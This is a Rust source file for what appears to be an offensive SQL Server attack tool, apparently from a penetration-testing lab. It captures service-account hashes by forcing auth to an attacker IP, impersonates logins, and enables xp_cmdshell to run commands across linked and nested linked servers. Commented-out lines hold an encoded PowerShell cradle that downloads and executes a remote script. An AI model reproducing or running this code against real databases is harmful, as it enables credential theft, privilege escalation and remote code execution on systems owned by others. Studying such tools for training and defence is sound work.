use async_std::net::TcpStream;
use anyhow;
use std::io;

use tiberius::{Config, AuthMethod, Client, Query, QueryStream, Row};

async fn db_conn() -> anyhow::Result<Client<TcpStream>> {
    let mut config: Config = Config::new();
    //config.host("appsrv01.corp1.com"); // dc01
    println!("Enter FQDN of host:");
    let fqdn: String = get_input();

    println!("[+] Connecting to database...");
    config.host(&fqdn);
    config.database("master");
    config.port(1433);
    config.trust_cert();

    config.authentication(AuthMethod::Integrated);

    let tcp: TcpStream = TcpStream::connect(config.get_addr()).await?;
    tcp.set_nodelay(true)?;

    let client: Client<TcpStream> = Client::connect(config, tcp).await?;

    Ok(client)
}

async fn get_query(client: &mut Client<TcpStream>, query: &str, is_str: bool) -> anyhow::Result<Vec<String>> {
    let select: Query = Query::new(query);
    let stream: QueryStream = select.query(client).await?;

    let rows: Vec<Row> = stream.into_first_result().await?;
    let mut rowtext: Vec<String> = Vec::new();
    for (_, row) in rows.iter().enumerate() {
        if is_str {
            rowtext.push(row.get::<&str, _>(0).unwrap().to_string());
        } else {
            rowtext.push(row.get::<i32, _>(0).unwrap().to_string());
        }
    }

    Ok(rowtext)
}

async fn execute_query(client: &mut Client<TcpStream>, query: &str) {
   let exec: Query = Query::new(query);
   let stream: Result<QueryStream, _> = exec.query(client).await;
   stream.ok();
}

fn get_input() -> String {
    let mut buf: String = String::new();
    io::stdin().read_line(&mut buf).unwrap();

    return buf.trim().to_string();
}

fn get_answer(question: &str) -> bool {
    println!("{}", question);
    let answer: String = get_input();
    if answer.to_lowercase() == "y" {
        return true;
    }
    false
}

async fn exec_cmd(client: &mut Client<TcpStream>, computer: &str, linked: bool) {
    println!("Enter command to run:");
    let command: String = get_input();
    if linked {
        println!("[+] Enabling advanced options on {}", computer);
        let mut query: String = String::from(format!("EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT {}", computer));
        execute_query(client, &query).await;

        println!("[+] Enabling xp_cmdshell on {}", computer);
        query = String::from(format!("EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT {}", computer));
        execute_query(client, &query).await;

        println!("[+] Executing command");
        query = String::from(format!("EXEC ('xp_cmdshell ''{}'' ') AT {}", &command, computer));
        execute_query(client, &query).await;
    } else {
        println!("[+] Enabling advanced options on {}", computer);
        let mut query: String = String::from("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
        execute_query(client, &query).await;

        println!("[+] Enabling xp_cmdshell on {}", computer);
        query = String::from("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
        execute_query(client, &query).await;

        println!("[+] Executing command");
        query = String::from(format!("EXEC xp_cmdshell '{}'", &command));
        execute_query(client, &query).await;
    }
}

async fn exec_nested_cmd(client: &mut Client<TcpStream>, linked_comp: &str, nested_linked_comp: &str) {
    println!("Enter command to run:");
    let command: String = get_input();

    println!("[+] Enabling advanced options on {}", &nested_linked_comp);
    let mut query = String::from(format!("EXEC ('EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT {}') AT {}", &nested_linked_comp, &linked_comp));
    execute_query(client, &query).await;

    println!("[+] Enabling xp_cmdshell on {}", &nested_linked_comp);
    query = String::from(format!("EXEC ('EXEC(''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT {}') AT {}", &nested_linked_comp, &linked_comp));
    execute_query(client, &query).await;

    println!("[+] Executing nested command");
    query = String::from(format!("EXEC ('EXEC(''xp_cmdshell ''''{}'''' '') AT {}') AT {}", &command, &nested_linked_comp, &linked_comp));
    execute_query(client, &query).await;

}

#[async_std::main]
async fn main() {
    println!("Enter computer name...");
    let comp: String = get_input();

    let mut conn: Client<TcpStream> = db_conn().await.expect("[!] Auth failed!");
    println!("[+] Auth OK!");

    let user: Vec<String> = get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap();
    let m_user: Vec<String> = get_query(&mut conn, "SELECT USER_NAME()", true).await.unwrap();
    let public_role: Vec<String> = get_query(&mut conn, "SELECT IS_SRVROLEMEMBER('public')", false).await.unwrap();
    let sysadmin_role: Vec<String> = get_query(&mut conn, "SELECT IS_SRVROLEMEMBER('sysadmin')", false).await.unwrap();

    println!("--> Logged in as: {}", user[0]);
    println!("--> Mapped to user: {}", m_user[0]);

    if public_role[0].parse::<i32>().unwrap() == 1 {
        println!("--> User is a member of public role");
    } else {
        println!("--> User is NOT a member of public role");
    }

    if sysadmin_role[0].parse::<i32>().unwrap() == 1 {
        println!("--> User is a member of sysadmin");
    } else {
        println!("--> User is NOT a member of sysadmin");
    }

    if get_answer("Attempt auth back to get svc account hash? (y/n)") {
        println!("Enter your IP address: ");
        let ip_addr: String = get_input();
        println!("[+] Attempting auth back to get svc account hash...Check Responder!");
        let query: String = String::from(format!("EXEC master..xp_dirtree \"\\\\{}\\\\test\"", &ip_addr));
        execute_query(&mut conn, &query).await;
    }

    if get_answer("Check for users that can be impersonated? (y/n)") {
        println!("[+] Checking for users that can be impersonated...");

        let mut query: String = String::from("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'");
        let impersonate_users: Vec<String> = get_query(&mut conn, &query, true).await.unwrap();

        if impersonate_users.len() > 0 {
            for (i, user) in impersonate_users.iter().enumerate() {
                println!("[{i}] {user}");
            }
            println!("Select user to impersonate:");
            let impersonate_user_choice: String = get_input();
            let impersonate_user: &String = &impersonate_users[impersonate_user_choice.parse::<usize>().unwrap()];
            println!("[+] Trying to impersonate {}", impersonate_user);
            query = String::from(format!("EXECUTE AS LOGIN = '{}'", impersonate_user));
            execute_query(&mut conn, &query).await;

            if get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0] == impersonate_user.to_string() {
                println!("[+] Success!");
                println!("--> Now logged in as: {}", get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0]);
            } else {
                println!("[!] Could not impersonate user!");
                println!("[+] Trying to impersonate dbo user...");
                query = String::from("use msdb; EXECUTE AS USER = 'dbo'");
                execute_query(&mut conn, &query).await;
                let curr_user: Vec<String> = get_query(&mut conn, "SELECT USER_NAME()", true).await.unwrap();
                if curr_user[0] == "dbo" {
                    println!("[+] Success! Now executing as {}", curr_user[0]);
                } else {
                    println!("[!] Could not impersonate dbo user");
                }
            }
        } else {
            println!("[!] Could not find any users to impersonate");
        }
    }

    if get_answer(format!("Do you want to execute a command on {}? (y/n)", &comp).as_str()) {
        exec_cmd(&mut conn, &comp, false).await;
    }

    if get_answer("Check for linked SQL servers? (y/n)") {
        println!("[+] Checking for linked SQL servers...");

        let linked: Vec<String> = get_query(&mut conn, "EXEC sp_linkedservers", true).await.unwrap();

        // let cmd_res: Vec<String> = get_query(&mut conn, "select version from openquery(\"dc01\", 'select @@version as version')", true).await.unwrap();
        // println!("{}", cmd_res[0]);
        if linked.len() > 0 {
            for (i, comp) in linked.iter().enumerate() {
                println!("--> [{i}] {comp}");
            }

            println!("Select linked computer to use:");
            let linked_comp_choice: String = get_input();
            let linked_comp: &String = &linked[linked_comp_choice.parse::<usize>().unwrap()];

            let mut sub_query: String = String::from("select SYSTEM_USER as s_user"); 
            let mut query: String = String::from(format!("select s_user from openquery(\"{}\", '{}')", &linked_comp, &sub_query));
            println!("--> Executing as {} on {}", get_query(&mut conn, &query, true).await.unwrap()[0], &linked_comp);

            if get_answer("Do you want to execute a command? (y/n)") {
                // ask method ?
                exec_cmd(&mut conn, &linked_comp, true).await;
            }

            if get_answer(format!("Do you want to find additional linked SQL servers on {}? (y/n)", &linked_comp).as_str()) {
                // Nested commands
                println!("[+] Finding linked servers on {}", &linked_comp);
                query = String::from(format!("EXEC ('sp_linkedservers') AT {}", &linked_comp));
                let nested_linked: Vec<String> = get_query(&mut conn, &query, true).await.unwrap();

                if nested_linked.len() > 0 {
                    for (i, comp) in nested_linked.iter().enumerate() {
                        println!("--> [{i}] {comp}");
                    }
                    println!("Select nested linked computer to use:");
                    let nested_linked_comp_choice: String = get_input();
                    let nested_linked_comp: &String = &nested_linked[nested_linked_comp_choice.parse::<usize>().unwrap()];

                    sub_query = String::from(format!("select mylogin from openquery(\"{}\", ''select SYSTEM_USER as mylogin'')", &nested_linked_comp));
                    query = String::from(format!("select mylogin from openquery(\"{}\", '{}')", &linked_comp, &sub_query));

                    println!("--> Executing as {} on {}", get_query(&mut conn, &query, true).await.unwrap()[0], &nested_linked_comp);

                    if get_answer(format!("Do you want to execute a command on {}? (y/n)", &nested_linked_comp).as_str()) {
                        exec_nested_cmd(&mut conn, &linked_comp, &nested_linked_comp).await;
                    }

                } else {
                    println!("[!] No additional linked SQL servers found!");
                }
            }

        } else {
            println!("[!] No linked SQL servers found!");
        }
    }

    // println!("[+] Executing command");
    // query = String::from("EXEC ('xp_cmdshell ''powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcANQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='' ') AT DC01");
    // execute_query(&mut conn, &query).await;



    // println!("[+] Enabling OLE Automation Procedures");
    // query = String::from("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE");
    // execute_query(&mut conn, &query).await;

    // println!("[+] Executing command");
    // query = String::from("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcANQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==\"'");
    // execute_query(&mut conn, &query).await;

        
}
